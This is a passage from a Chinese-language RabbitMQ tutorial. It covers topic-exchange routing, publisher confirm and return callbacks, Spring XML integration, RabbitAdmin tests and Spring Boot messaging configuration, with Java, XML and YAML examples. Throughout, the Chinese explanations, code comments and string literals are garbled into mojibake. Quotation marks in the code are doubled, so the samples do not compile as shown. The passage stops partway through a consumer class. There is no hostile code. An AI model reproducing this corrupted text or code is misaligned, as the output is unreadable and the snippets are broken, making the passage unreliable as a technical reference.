> **ä¸»é¢˜æ¨¡å¼**ï¼šç±»ä¼¼äºè·¯ç”±æ¨¡å¼ï¼Œä½†æ˜¯ä¸»é¢˜æ¨¡å¼å¯ä»¥ä½¿ç”¨é€šé…ç¬¦æ¥æ¨¡ç³ŠåŒ¹é…è·¯ç”±é”®ã€‚è¿™æ ·å¯ä»¥æ›´çµæ´»åœ°å®šä¹‰è·¯ç”±è§„åˆ™ï¼Œå®ç°æ›´ç²¾ç¡®çš„æ¶ˆæ¯è·¯ç”±ã€‚

ä¸»é¢˜æ¨¡å¼ä¸­ä½¿ç”¨çš„äº¤æ¢æœºç±»å‹æ˜¯`Topic Exchange`ã€‚

æ¨¡ç³ŠåŒ¹é…è§„åˆ™ï¼š

* `*`ï¼šåŒ¹é…ä¸€ä¸ªå•è¯
* `#`ï¼šåŒ¹é…é›¶ä¸ªæˆ–å¤šä¸ªå•è¯
* `.`ï¼šåˆ†éš”å•è¯

**ä½¿ç”¨åœºæ™¯ï¼š**

ä¸»é¢˜æ¨¡å¼é€‚ç”¨äºéœ€è¦æ›´çµæ´»çš„æ¶ˆæ¯è·¯ç”±è§„åˆ™çš„åœºæ™¯ï¼Œä¾‹å¦‚ï¼šæ–°é—»ç³»ç»Ÿä¸­æ ¹æ®æ–°é—»ç±»å‹å°†æ¶ˆæ¯å‘é€åˆ°ä¸åŒçš„é˜Ÿåˆ—ã€‚

**ä»£ç å®ç°ï¼š**

1. ä½¿ç”¨ç®¡ç†ç•Œé¢åˆ›å»ºäº¤æ¢æœº`news`ï¼Œç±»å‹é€‰æ‹©`topic`ã€‚
2. åˆ›å»º`NewsSystem`å‘å¸ƒè€…ï¼Œå‘é€æ–°é—»æ¶ˆæ¯ã€‚

   ```java
   /**
    * ä¸»é¢˜æ¨¡å¼é€‚ç”¨äºæ¶ˆæ¯ç­›é€‰çš„åœºæ™¯ï¼Œä¾‹å¦‚ï¼šæ–°é—»ç³»ç»Ÿå‘å¸ƒæ–°é—»ä¿¡æ¯ï¼Œè®¢é˜…è€…æ ¹æ®å…³é”®å­—æ¥æ”¶æ–°é—»ä¿¡æ¯ã€‚
    */
   public class NewsSystem {
       public static void main(String[] args) throws IOException, TimeoutException {
           try (Connection connection = RabbitUtils.getConnection();
                Channel channel = connection.createChannel()) {
   
               LinkedHashMap<String, String> news = new LinkedHashMap<>();
               news.put(""china.news"", ""ä¸­å›½æ–°é—»"");
               news.put(""china.weather"", ""ä¸­å›½å¤©æ°”"");
               news.put(""world.news"", ""å›½é™…æ–°é—»"");
               news.put(""world.weather"", ""å›½é™…å¤©æ°”"");
   
               for (Map.Entry<String, String> entry : news.entrySet()) {
                   String routingKey = entry.getKey();
                   String message = entry.getValue();
                   // æ³¨æ„âš ï¸ï¼šç¬¬äºŒä¸ªå‚æ•°æ˜¯ routingKeyï¼Œç”¨äºæ¶ˆæ¯çš„ç­›é€‰
                   channel.basicPublish(RabbitConstant.EXCHANGE_NEWS, routingKey, null, message.getBytes());
                   System.out.println("" [x] å‘é€ '"" + routingKey + ""':'"" + message + ""'"");
               }
           }
       }
   }
   ```

3. åˆ›å»º`ChinaNewsConsumer`ã€`WorldNewsConsumer`æ¶ˆè´¹è€…ï¼Œæ¥æ”¶æ–°é—»æ¶ˆæ¯ã€‚

   ```java
   public class ChinaNewsConsumer {
       public static void main(String[] args) throws IOException {
           Connection connection = RabbitUtils.getConnection();
           Channel channel = connection.createChannel();
   
           // æ³¨æ„âš ï¸ï¼šé˜Ÿåˆ—ç»‘å®šäº¤æ¢æœºæ—¶ï¼Œéœ€è¦æŒ‡å®šroutingKeyè¿›è¡Œè§„åˆ™åŒ¹é…
           channel.queueDeclare(RabbitConstant.QUEUE_CHINA_NEWS, true, false, false, null);
           channel.queueBind(RabbitConstant.QUEUE_CHINA_NEWS, RabbitConstant.EXCHANGE_NEWS, ""china.*"");
   
           channel.basicQos(1);
           channel.basicConsume(RabbitConstant.QUEUE_CHINA_NEWS, false,
                   // æ¶ˆè´¹è€…æ¥æ”¶æ¶ˆæ¯å›è°ƒ
                   (consumerTag, message) -> {
                       String jsonSMS = new String(message.getBody());
                       System.out.println(""ChinaNewsConsumer-æ”¶åˆ°æ¶ˆæ¯ï¼š"" + jsonSMS);
                       // æ‰‹åŠ¨ackç¡®è®¤
                       channel.basicAck(message.getEnvelope().getDeliveryTag(), false);
                   },
                   // æ¶ˆè´¹è€…å–æ¶ˆæ¶ˆè´¹å›è°ƒ
                   consumerTag -> {
                   });
       }
   }
   ```

**ä»£ç è¿è¡Œç»“æœï¼š**

ç”Ÿäº§è€…ï¼š

```jshell
 [x] å‘é€ 'china.news':'ä¸­å›½æ–°é—»'
 [x] å‘é€ 'china.weather':'ä¸­å›½å¤©æ°”'
 [x] å‘é€ 'world.news':'å›½é™…æ–°é—»'
 [x] å‘é€ 'world.weather':'å›½é™…å¤©æ°”'
```

æ¶ˆè´¹è€…ï¼š

```shell
ChinaNewsConsumer-æ”¶åˆ°æ¶ˆæ¯ï¼šä¸­å›½æ–°é—»
ChinaNewsConsumer-æ”¶åˆ°æ¶ˆæ¯ï¼šä¸­å›½å¤©æ°”
```

```shell
WorldNewsConsumer-æ”¶åˆ°æ¶ˆæ¯ï¼šå›½é™…æ–°é—»
WorldNewsConsumer-æ”¶åˆ°æ¶ˆæ¯ï¼šå›½é™…å¤©æ°”
```

## 11-RabbitMQæ¶ˆæ¯ç¡®è®¤æœºåˆ¶

**æ¶ˆæ¯ç¡®è®¤æœºåˆ¶**ï¼š

RabbitMQåœ¨æŠ•é€’æ¶ˆæ¯çš„è¿‡ç¨‹ä¸­å……å½“ä»£ç†äººï¼ˆBrokerï¼‰ï¼Œç”Ÿäº§è€…å°†æ¶ˆæ¯å‘é€åˆ°RabbitMQï¼ŒRabbitMQå°†æ¶ˆæ¯æŠ•é€’ç»™æ¶ˆè´¹è€…ã€‚

**æ¶ˆæ¯ç¡®è®¤æ¶‰åŠä¸¤ç§çŠ¶æ€**ï¼š

* **Confirm**ï¼šç”Ÿäº§è€…å°†æ¶ˆæ¯å‘é€åˆ°Brokeræ—¶çš„çŠ¶æ€ï¼Œåç»­ä¼šå‡ºç°ä¸¤ç§æƒ…å†µï¼š
    * `ack`ï¼šBrokeræˆåŠŸæ¥æ”¶åˆ°æ¶ˆæ¯
    * `nack`ï¼šBrokeræ‹’æ”¶æ¶ˆæ¯ã€‚åŸå› æœ‰å¤šç§ï¼Œä¾‹å¦‚ï¼šé˜Ÿåˆ—å·²æ»¡ã€æ¶ˆæ¯æ ¼å¼é”™è¯¯ï¼Œé™æµï¼ŒIOå¼‚å¸¸ç­‰ã€‚
* **Return**ï¼šBrokeræ­£å¸¸æ¥æ”¶ï¼ˆackï¼‰åï¼Œä½†Brokeræ²¡æœ‰å¯¹åº”çš„é˜Ÿåˆ—è¿›è¡ŒæŠ•é€’æ—¶äº§ç”Ÿçš„çŠ¶æ€ï¼Œæ¶ˆæ¯è¢«é€€å›ç»™ç”Ÿäº§è€…ã€‚

æ³¨æ„âš ï¸ï¼šä»¥ä¸Šä¸¤ç§çŠ¶æ€æ˜¯Brokerä¸ç”Ÿäº§è€…ä¹‹é—´çš„çŠ¶æ€ï¼Œä¸æ¶ˆè´¹è€…æ— å…³ã€‚

**ä½¿ç”¨åœºæ™¯**ï¼š

å¯¹äºä¸€äº›å…³é”®ä¸šåŠ¡çš„æ¶ˆæ¯ä¼ é€’ï¼Œå¦‚é‡‘èè®¢å•æ”¯ä»˜ï¼Œéœ€è¦ä¿è¯æ¶ˆæ¯çš„å¯é æ€§ä¼ é€’ï¼Œæ­¤æ—¶éœ€è¦ä½¿ç”¨æ¶ˆæ¯ç¡®è®¤æœºåˆ¶ã€‚

**ä»£ç å®ç°ï¼š**

1. ä½¿ç”¨ç®¡ç†ç•Œé¢åˆ›å»ºäº¤æ¢æœº`payment`ï¼Œç±»å‹é€‰æ‹©`topic`ã€‚
2. åˆ›å»º`PaymentSystem`å‘å¸ƒè€…ï¼Œå‘é€æ”¯ä»˜æ¶ˆæ¯ã€‚

   ```java
   /**
    * æ¶ˆæ¯ç¡®è®¤æœºåˆ¶é€‚ç”¨äºéœ€è¦ä¿è¯æ¶ˆæ¯å¯é æ€§ä¼ é€’çš„åœºæ™¯ï¼Œä¾‹å¦‚ï¼šé‡‘èç³»ç»Ÿä¸­æ”¯ä»˜è®¢å•ã€‚
    */
   public class PaymentSystem {
       public static void main(String[] args) throws IOException, TimeoutException {
   
           //æ³¨æ„âš ï¸ï¼šå…³é—­è¿æ¥å°±æ— æ³•ç›‘å¬å›æ‰
           Connection connection = RabbitUtils.getConnection();
           Channel channel = connection.createChannel();
   
           // å¼€å¯confirmç›‘å¬æ¨¡å¼
           channel.confirmSelect();
   
           // æ·»åŠ æ¶ˆæ¯ç¡®è®¤ç›‘å¬å™¨
           channel.addConfirmListener(
                   // ackCallback
                   (deliveryTag, multiple) -> {
                       System.out.println(""è®¢å•å·²è¢«Brokeræ¥æ”¶ï¼ŒæŠ•é€’æ ‡ç­¾ï¼š"" + deliveryTag);
                   },
                   // nackCallback
                   (deliveryTag, multiple) -> {
                       System.out.println(""è®¢å•å·²è¢«Brokeræ‹’æ”¶ï¼ŒæŠ•é€’æ ‡ç­¾ï¼š"" + deliveryTag);
                   });
   
           // æ·»åŠ æ¶ˆæ¯é€€å›ç›‘å¬å™¨
           channel.addReturnListener(returnMessage -> {
               System.out.println(""========æ”¯ä»˜è®¢å•è¢«é€€å›========"");
               System.out.println(""é€€å›ç¼–ç ï¼š"" + returnMessage.getReplyCode() + ""ï¼Œé€€å›æè¿°ï¼š"" + returnMessage.getReplyText());
               System.out.println(""äº¤æ¢æœºï¼š"" + returnMessage.getExchange() + ""ï¼Œè·¯ç”±é”®ï¼š"" + returnMessage.getRoutingKey());
               System.out.println(""é€€å›ä¸»é¢˜ï¼š"" + new String(returnMessage.getBody()));
               System.out.println(""==========================="");
           });
   
           // å‘é€æ”¯ä»˜è®¢å•æ¶ˆæ¯
           LinkedHashMap<String, String> paymentOrder = new LinkedHashMap<>();
           paymentOrder.put(""alipay.20991011"", ""æ”¯ä»˜å®è®¢å•20991011"");
           paymentOrder.put(""wechat.20991011"", ""å¾®ä¿¡è®¢å•20991011"");
           paymentOrder.put(""unionpay.20991011"", ""é“¶è”è®¢å•20991011"");
   
           for (Map.Entry<String, String> entry : paymentOrder.entrySet()) {
               String routingKey = entry.getKey();
               String message = entry.getValue();
               // æ³¨æ„âš ï¸ï¼šç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ mandatoryï¼Œç”¨äºæ¶ˆæ¯çš„é€€å›
               // å½“ä¸º true  æ—¶ï¼Œå¦‚æœæ¶ˆæ¯æ— æ³•æ­£å¸¸æŠ•é€’åˆ™ return å›ç”Ÿäº§è€…ï¼›
               // å½“ä¸º false æ—¶ï¼Œç›´æ¥å°†æ¶ˆæ¯æ”¾å¼ƒï¼›
               channel.basicPublish(RabbitConstant.EXCHANGE_PAYMENT, routingKey, true, null, message.getBytes());
               System.out.println("" [x] å‘é€ '"" + routingKey + ""':'"" + message + ""'"");
           }
   
       }
   }
   ```

3. åˆ›å»º`AlipayConsumer`ã€`WechatConsumer`æ¶ˆè´¹è€…ï¼Œæ¥æ”¶æ”¯ä»˜æ¶ˆæ¯ã€‚

   ```java
   public class AlipayPaymentConsumer {
       public static void main(String[] args) throws IOException, TimeoutException {
           Connection connection = RabbitUtils.getConnection();
           Channel channel = connection.createChannel();
   
           channel.queueDeclare(RabbitConstant.QUEUE_ALIPAY, true, false, false, null);
           channel.queueBind(RabbitConstant.QUEUE_ALIPAY, RabbitConstant.EXCHANGE_PAYMENT, ""alipay.*"");
   
           channel.basicConsume(RabbitConstant.QUEUE_ALIPAY, false, (consumerTag, message) -> {
               System.out.println(""æ”¯ä»˜å®æ”¶åˆ°è®¢å•ï¼š"" + new String(message.getBody()));
               // æ‰‹åŠ¨ackç¡®è®¤
               channel.basicAck(message.getEnvelope().getDeliveryTag(), false);
           }, consumerTag -> {
           });
       }
   }
   ```

**ä»£ç è¿è¡Œç»“æœï¼š**

ç”Ÿäº§è€…ï¼š

```jshell
 [x] å‘é€ 'alipay.20991011':'æ”¯ä»˜å®è®¢å•20991011'
 [x] å‘é€ 'wechat.20991011':'å¾®ä¿¡è®¢å•20991011'
 [x] å‘é€ 'unionpay.20991011':'é“¶è”è®¢å•20991011'
========æ”¯ä»˜è®¢å•è¢«é€€å›========
é€€å›ç¼–ç ï¼š312ï¼Œé€€å›æè¿°ï¼šNO_ROUTE
äº¤æ¢æœºï¼špaymentï¼Œè·¯ç”±é”®ï¼šunionpay.20991011
é€€å›ä¸»é¢˜ï¼šé“¶è”è®¢å•20991011
===========================
è®¢å•å·²è¢«Brokeræ¥æ”¶ï¼ŒæŠ•é€’æ ‡ç­¾ï¼š1
è®¢å•å·²è¢«Brokeræ¥æ”¶ï¼ŒæŠ•é€’æ ‡ç­¾ï¼š3
è®¢å•å·²è¢«Brokeræ¥æ”¶ï¼ŒæŠ•é€’æ ‡ç­¾ï¼š2
```

æ¶ˆè´¹è€…ï¼š

```shell
æ”¯ä»˜å®æ”¶åˆ°è®¢å•ï¼šæ”¯ä»˜å®è®¢å•20991011
å¾®ä¿¡æ”¶åˆ°è®¢å•ï¼šå¾®ä¿¡è®¢å•20991011
```

## 12-Springæ•´åˆRabbitMQ

æœ‰äº†ä»¥ä¸Šçš„åŸºç¡€çŸ¥è¯†ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨Springæ•´åˆRabbitMQï¼Œå®ç°æ›´åŠ ä¾¿æ·çš„æ¶ˆæ¯ä¼ é€’ã€‚

1.åˆ›å»ºä¸€ä¸ª`spring-rabbitmq`çš„Mavené¡¹ç›®ã€‚

2.æ·»åŠ ä¾èµ–`spring-rabbit`ã€‚

3.ç¼–å†™é…ç½®æ–‡ä»¶`applicationContext.xml`ï¼Œä½¿ç”¨`application.properties`è¿›è¡Œé…ç½®ã€‚

```xml

<beans xmlns=""http://www.springframework.org/schema/beans""
       xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
       xmlns:p=""http://www.springframework.org/schema/p""
       xmlns:context=""http://www.springframework.org/schema/context""
       xmlns:rabbit=""http://www.springframework.org/schema/rabbit""
       xsi:schemaLocation=""http://www.springframework.org/schema/beans
           http://www.springframework.org/schema/beans/spring-beans.xsd
           http://www.springframework.org/schema/context
           http://www.springframework.org/schema/context/spring-context.xsd
           http://www.springframework.org/schema/rabbit
           http://www.springframework.org/schema/rabbit/spring-rabbit.xsd"">

    <!-- åŠ è½½å¤–éƒ¨å±æ€§æ–‡ä»¶ -->
    <!-- property-placeholderåªèƒ½åŠ è½½propertiesæ–‡ä»¶ï¼Œä¸èƒ½åŠ è½½yamlæ–‡ä»¶ -->
    <context:property-placeholder location=""classpath:application.properties""/>

    <!-- RabbitMQè¿æ¥å·¥å‚ -->
    <rabbit:connection-factory id=""connectionFactory""
                               host=""${spring.rabbitmq.host}""
                               port=""${spring.rabbitmq.port}""
                               username=""${spring.rabbitmq.username}""
                               password=""${spring.rabbitmq.password}""
                               virtual-host=""${spring.rabbitmq.virtual-host}""/>

    <!-- å£°æ˜ä¸€ä¸ªåä¸ºtopicExchangeçš„äº¤æ¢æœºï¼Œè‡ªåŠ¨åˆ›å»ºï¼Œç±»å‹ä¸ºtopic -->
    <!-- äº¤æ¢æœºç±»å‹æœ‰å››ç§ï¼šdirectã€fanoutã€topicã€headers -->
    <rabbit:topic-exchange name=""topicExchange"" auto-declare=""true"">
        <!-- ç»‘å®šé˜Ÿåˆ—ï¼Œpatternè¡¨ç¤ºåŒ¹é…è§„åˆ™ -->
        <rabbit:bindings>
            <rabbit:binding queue=""topicQueue"" pattern=""china.*""/>
            <rabbit:binding queue=""topicQueue"" pattern=""us.*""/>
        </rabbit:bindings>
    </rabbit:topic-exchange>

    <!-- åˆ›å»ºé˜Ÿåˆ— -->
    <rabbit:queue name=""topicQueue"" auto-declare=""true""
                  durable=""true"" exclusive=""false"" auto-delete=""false""/>

    <!-- RabbitMQæ¨¡æ¿ -->
    <rabbit:template id=""rabbitTemplate"" connection-factory=""connectionFactory"" exchange=""topicExchange""/>

    <!-- æ¶ˆæ¯ç”Ÿäº§è€… -->
    <bean id=""newsProducer"" class=""cn.geekyspace.rabbitmq.exchange.NewsProducer""
          p:rabbitTemplate-ref=""rabbitTemplate""/>

    <!-- æ¶ˆæ¯æ¶ˆè´¹è€… -->
    <bean id=""newsConsumer"" class=""cn.geekyspace.rabbitmq.consumer.NewsConsumer""
          p:rabbitTemplate-ref=""rabbitTemplate""/>

    <!-- RabbitAdminå¯¹è±¡ç”¨äºåˆ›å»ºï¼Œåˆ é™¤ï¼Œç»‘å®šé˜Ÿåˆ—ï¼Œäº¤æ¢æœºç­‰ -->
    <rabbit:admin id=""rabbitAdmin"" connection-factory=""connectionFactory""/>

</beans>
```

```properties
spring.rabbitmq.host=localhost
spring.rabbitmq.port=5672
spring.rabbitmq.username=zhouyu
spring.rabbitmq.password=123456
spring.rabbitmq.virtual-host=/geekyspace
```

4.åˆ›å»º`NewsProducer`å‘å¸ƒè€…ï¼Œå‘é€æ–°é—»æ¶ˆæ¯ã€‚

```java
/**
 * æ–°é—»ç”Ÿäº§è€…ï¼Œç”Ÿäº§è€…é’ˆå¯¹äº¤æ¢æœºå‘é€æ¶ˆæ¯
 */
@Data
@NoArgsConstructor
@AllArgsConstructor
public class NewsProducer {

    private RabbitTemplate rabbitTemplate;
    private static final Gson gson = new Gson();

    // å‘å¸ƒæ–°é—»
    public void sendNews(String routingKey, News news) {
        rabbitTemplate.convertAndSend(routingKey, gson.toJson(news));
        System.out.println(""æ–°é—»å‘é€æˆåŠŸï¼Œæ ‡é¢˜: "" + news.getTitle());
    }

    public static void main(String[] args) {
        // åˆå§‹åŒ–IOCå®¹å™¨
        ApplicationContext ctx = new ClassPathXmlApplicationContext(""classpath:applicationContext.xml"");
        NewsProducer np = (NewsProducer) ctx.getBean(""newsProducer"");

        // å‘å¸ƒæ–°é—»
        np.sendNews(""us.20240513"", new News(""æ–°åç¤¾"", ""GPT-4oç®€ä»‹"", ""GPT-4oç«‹å³è¯•ç”¨"", new Date()));
        np.sendNews(""china.20240516"", new News(""36æ°ª"", ""Kimi.ai"", ""å¸®ä½ çœ‹æ›´å¤§çš„ä¸–ç•Œ"", new Date()));
    }

}
```

5.åˆ›å»º`NewsConsumer`æ¶ˆè´¹è€…ï¼Œæ¥æ”¶æ–°é—»æ¶ˆæ¯ã€‚

```java
/**
 * æ–°é—»æ¶ˆè´¹è€…ï¼Œæ¶ˆè´¹è€…ä»é˜Ÿåˆ—ä¸­æ¥æ”¶æ¶ˆæ¯
 */
@Data
@NoArgsConstructor
@AllArgsConstructor
public class NewsConsumer implements MessageListener {

    private RabbitTemplate rabbitTemplate;
    private static final Gson gson = new Gson();

    @Override
    public void onMessage(Message message) {
        // å¤„ç†æ¥æ”¶åˆ°çš„æ¶ˆæ¯
        final News news = gson.fromJson(new String(message.getBody()), News.class);
        System.out.printf(""æ¥æ”¶åˆ°æœ€æ–°æ–°é—»: æ ‡é¢˜-%s å†…å®¹-%s%n"", news.getTitle(), news.getContent());
    }

    public static void main(String[] args) {
        //åˆå§‹åŒ–IOCå®¹å™¨
        ApplicationContext ctx = new ClassPathXmlApplicationContext(""classpath:applicationContext.xml"");
        RabbitTemplate rabbitTemplate = ctx.getBean(RabbitTemplate.class);

        // åˆ›å»ºæ¶ˆè´¹è€…
        NewsConsumer newsConsumer = new NewsConsumer();

        // è®¾ç½®æ¶ˆæ¯ç›‘å¬å®¹å™¨
        SimpleMessageListenerContainer container = new SimpleMessageListenerContainer();
        container.setConnectionFactory(rabbitTemplate.getConnectionFactory());
        container.setQueueNames(""topicQueue""); // è®¾ç½®è¦ç›‘å¬çš„é˜Ÿåˆ—å
        container.setMessageListener(newsConsumer);

        // å¯åŠ¨ç›‘å¬
        container.start();
    }
}
```

## 13-ä½¿ç”¨RabbitAdminç®¡ç†MQ

**RabbitAdmin** æ˜¯ RabbitMQ çš„ç®¡ç†ç»„ä»¶ï¼Œç”¨äºç®¡ç† RabbitMQ çš„äº¤æ¢æœºã€é˜Ÿåˆ—ã€ç»‘å®šå…³ç³»ç­‰ã€‚

**ä»£ç ç¤ºä¾‹ï¼š**

```java

@RunWith(SpringJUnit4ClassRunner.class)
@ContextConfiguration(""classpath:applicationContext.xml"")
public class RabbitAdminTest {

    @Autowired
    private RabbitAdmin rabbitAdmin;

    @Autowired
    private RabbitTemplate rabbitTemplate;

    // åˆ›å»ºäº¤æ¢æœº
    @Test
    public void testCreateExchange() {
        rabbitAdmin.declareExchange(new DirectExchange(""test.direct"", true, false));
        rabbitAdmin.declareExchange(new FanoutExchange(""test.fanout"", true, false));
        rabbitAdmin.declareExchange(new TopicExchange(""test.topic"", true, false));
    }

    // åˆ é™¤äº¤æ¢æœº
    @Test
    public void testDeleteExchange() {
        rabbitAdmin.deleteExchange(""test.direct"");
        rabbitAdmin.deleteExchange(""test.fanout"");
        rabbitAdmin.deleteExchange(""test.topic"");
    }

    // åˆ›å»ºé˜Ÿåˆ—
    @Test
    public void testCreateQueue() {
        rabbitAdmin.declareQueue(new Queue(""test.direct.queue"", true));
        rabbitAdmin.declareQueue(new Queue(""test.fanout.queue"", true));
        rabbitAdmin.declareQueue(new Queue(""test.topic.queue"", true));
    }

    // åˆ é™¤é˜Ÿåˆ—
    @Test
    public void testDeleteQueue() {
        rabbitAdmin.deleteQueue(""test.direct.queue"");
        rabbitAdmin.deleteQueue(""test.topic.queue"");
        rabbitAdmin.deleteQueue(""test.fanout.queue"");
    }

    // ç»‘å®šé˜Ÿåˆ—
    @Test
    public void testBinding() {
        Binding directBinding = new Binding(
                ""test.direct.queue"", Binding.DestinationType.QUEUE,
                ""test.direct"", ""test.direct.queue"", null);
        Binding fanoutBinding = new Binding(
                ""test.fanout.queue"", Binding.DestinationType.QUEUE,
                ""test.fanout"", ""#"", null);
        Binding topicBinding = new Binding(
                ""test.topic.queue"", Binding.DestinationType.QUEUE,
                ""test.topic"", ""#"", null);
        rabbitAdmin.declareBinding(directBinding);
        rabbitAdmin.declareBinding(fanoutBinding);
        rabbitAdmin.declareBinding(topicBinding);
    }

    // å‘é€æ¶ˆæ¯
    @Test
    public void testSendMessage() {
        // ç›´è¿äº¤æ¢æœºï¼Œç”¨äºç®€å•æ¨¡å¼å’Œå·¥ä½œé˜Ÿåˆ—
        rabbitTemplate.convertAndSend(""test.direct"", ""test.direct.queue"", ""Hello, RabbitMQ !"");
        // æ‰‡å½¢äº¤æ¢æœºï¼Œç”¨äºå‘å¸ƒè®¢é˜…
        rabbitTemplate.convertAndSend(""test.fanout"", """", ""é•¿æ²™å¤©æ°”ï¼šæ™´"");
        // ä¸»é¢˜äº¤æ¢æœºï¼Œç”¨äºè·¯ç”±æ¨¡å¼å’Œä¸»é¢˜æ¨¡å¼
        rabbitTemplate.convertAndSend(""test.topic"", ""china.news"", ""ä¸­å›½æ–°é—»"");

        // q: Headersäº¤æ¢æœºå·¥ä½œåŸç†æ˜¯ä»€ä¹ˆï¼Ÿ
        // a: é€šè¿‡æ¶ˆæ¯å¤´æ¥è·¯ç”±æ¶ˆæ¯ï¼Œé€šè¿‡ x-match å‚æ•°æ¥æŒ‡å®šåŒ¹é…è§„åˆ™ï¼Œæœ‰ all å’Œ any ä¸¤ç§è§„åˆ™ã€‚
    }

    // æ¥æ”¶æ¶ˆæ¯
    @Test
    public void testReceiveMessage() {
        Object directMessage = rabbitTemplate.receiveAndConvert(""test.direct.queue"");
        Object fanoutMessage = rabbitTemplate.receiveAndConvert(""test.fanout.queue"");
        Object topicMessage = rabbitTemplate.receiveAndConvert(""test.topic.queue"");
        System.out.println(""directMessage = "" + directMessage);
        System.out.println(""fanoutMessage = "" + fanoutMessage);
        System.out.println(""topicMessage = "" + topicMessage);
    }

}
```

æœŸé—´æäº†ä¸€ä¸ª[Issues-11268](https://github.com/rabbitmq/rabbitmq-server/discussions/11268)ï¼Œå…³äºç›´è¿äº¤æ¢æœºè·¯ç”±é”®ä¸º`#`çš„é—®é¢˜ã€‚

## 14-ä½¿ç”¨SpringBootæ•´åˆRabbitMQ

Javaå¼€å‘è€…æœ€å¸¸ç”¨çš„æ¡†æ¶ä¹‹ä¸€æ˜¯SpringBootï¼ŒSpringBootæä¾›äº†ä¸°å¯Œçš„è‡ªåŠ¨é…ç½®åŠŸèƒ½ï¼Œå¯ä»¥ç®€åŒ–RabbitMQçš„é…ç½®ã€‚

1.åˆ›å»ºä¸€ä¸ª`springboot-rabbitmq`çš„SpringBooté¡¹ç›®ã€‚
2.æ·»åŠ ä¾èµ–`spring-boot-starter-amqp`ã€‚
3.ç¼–å†™é…ç½®æ–‡ä»¶`application.yml`ã€‚

```yaml
spring:
  application:
    name: springboot-rabbitmq
  rabbitmq:
    # è¿æ¥é…ç½®
    host: localhost
    port: 5672
    username: zhouyu
    password: 123456
    virtual-host: /geekyspace
    connection-timeout: 1000
    # ç”Ÿäº§è€…é…ç½®ï¼š
    publisher-confirm-type: correlated  # å¯¹äº Spring Boot 2.2+ï¼Œæ›¿ä»£äº† publisher-confirms å’Œ publisher-returns
    template:
      mandatory: true
    # æ¶ˆè´¹è€…é…ç½®ï¼š
    listener:
      simple:
        acknowledge-mode: manual
        concurrency: 1
        max-concurrency: 5
```

4.ä½¿ç”¨ç®¡ç†ç•Œé¢åˆ›å»ºäº¤æ¢æœº`springboot-exchange`ï¼Œç±»å‹é€‰æ‹©`topic`ï¼Œå¹¶åˆ›å»ºä¸€ä¸ªé˜Ÿåˆ—`springboot-queue`ä¸ä¹‹ç»‘å®šã€‚

*
ç¼ºå°‘äº¤æ¢æœºæŠ¥é”™ï¼š`reply-code=404, reply-text=NOT_FOUND - no exchange 'springboot-exchange' in vhost '/geekyspace', class-id=60, method-id=40`
* ç¼ºå°‘ç»‘å®šçš„é˜Ÿåˆ—æŠ¥é”™ï¼š` reply-code=312, reply-text=NO_ROUTE`

5.ç¼–å†™ç”Ÿäº§è€…`MessageProducer`åŠå‘˜å·¥ç±»`Employee`ã€‚

```java

@Component
@RequiredArgsConstructor
public class MessageProducer {

    // æ„é€ å‡½æ•°æ³¨å…¥
    private final RabbitTemplate rabbitTemplate;

    private static final Gson gson = new Gson();

    RabbitTemplate.ConfirmCallback confirmCallback = (correlationData, ack, cause) -> {
        System.out.println(""æ¶ˆæ¯id:"" + correlationData);
        System.out.println(""ack:"" + ack);
        if (ack) {
            System.out.println(""æ¶ˆæ¯å‘é€ç¡®è®¤æˆåŠŸ"");
        } else {
            System.out.println(""æ¶ˆæ¯å‘é€ç¡®è®¤å¤±è´¥:"" + cause);
        }
    };

    RabbitTemplate.ReturnsCallback returnCallback = returnedMessage -> {
        System.out.println(""========å‘é€å¤±è´¥å›æ‰========"");
        System.out.println(""é€€å›ç¼–ç : "" + returnedMessage.getReplyCode() + "", é€€å›æè¿°: "" + returnedMessage.getReplyText());
        System.out.println(""äº¤æ¢æœº: "" + returnedMessage.getExchange() + "", è·¯ç”±é”®ï¼š"" + returnedMessage.getRoutingKey());
        System.out.println(""æ¶ˆæ¯ä¸»ä½“: "" + new String(returnedMessage.getMessage().getBody()));
        System.out.println(""==========================="");
    };

    // ç”Ÿäº§è€…å‘é€æ¶ˆæ¯
    public void sendMessages(Employee employee) {

        // æ¶ˆæ¯å‘é€ç¡®è®¤ï¼Œç¡®è®¤æ¶ˆæ¯æ˜¯å¦åˆ°è¾¾brokeræœåŠ¡å™¨
        rabbitTemplate.setConfirmCallback(confirmCallback);

        // æ¶ˆæ¯å‘é€å¤±è´¥è¿”å›åˆ°é˜Ÿåˆ—ä¸­
        // å¿…é¡»é…ç½® spring.rabbitmq.template.mandatory=true æ‰èƒ½ä½¿ç”¨
        rabbitTemplate.setReturnsCallback(returnCallback);

        // æ¶ˆæ¯çš„é™„åŠ ä¿¡æ¯ï¼Œå³è‡ªå®šä¹‰id
        final CorrelationData cd = new CorrelationData(employee.getNumber() + ""-"" + System.currentTimeMillis());
        rabbitTemplate.convertAndSend(""springboot-exchange"", ""hr.employee"", gson.toJson(employee), cd);
    }
}
```

```java

@Data
@NoArgsConstructor
@AllArgsConstructor
public class Employee implements Serializable {

    // å‘˜å·¥ç¼–å·
    private String number;

    // å‘˜å·¥å§“å
    private String name;

    // å‘˜å·¥å¹´é¾„
    private Integer age;

}
```

6.ç¼–å†™æ¶ˆè´¹è€…`MessageConsumer`ã€‚

```java

@Component
public class MessageConsumer {

    private static final Gson gson = new Gson();

    /**
     * æ¶ˆè´¹è€…ç›‘å¬æ¶ˆæ¯ï¼Œå¹¶å¤„ç†æ¥æ”¶åˆ°çš„æ¶ˆæ¯
     */
    // @RabbitHandleræ³¨è§£ï¼Œæ ‡è¯†è¯¥æ–¹æ³•æ˜¯ RabbitMQ çš„æ¶ˆæ¯å¤„ç†æ–¹æ³•
    @RabbitHandler
    // @RabbitListeneræ³¨è§£ï¼Œæ ‡è¯†è¯¥æ–¹æ³•æ˜¯ RabbitMQ çš„æ¶ˆæ¯ç›‘å¬å™¨
    @RabbitListener(bindings = {
            // ç»‘å®šåˆ°æŒ‡å®šçš„é˜Ÿåˆ—ï¼Œä»æŒ‡å®šçš„äº¤æ¢æœºæ¥æ”¶æ¶ˆæ¯ï¼Œä½¿ç”¨æŒ‡å®šçš„è·¯ç”±é”®è¿›è¡Œç»‘å®šã€‚
            @QueueBinding(
                    value = @Queue(value = ""springboot-queue"", declare = ""true""),
                    exchange = @Exchange(value = ""springboot-exchange"", declare = ""true"", type = ""topic""),
                    key = ""#"")
    })
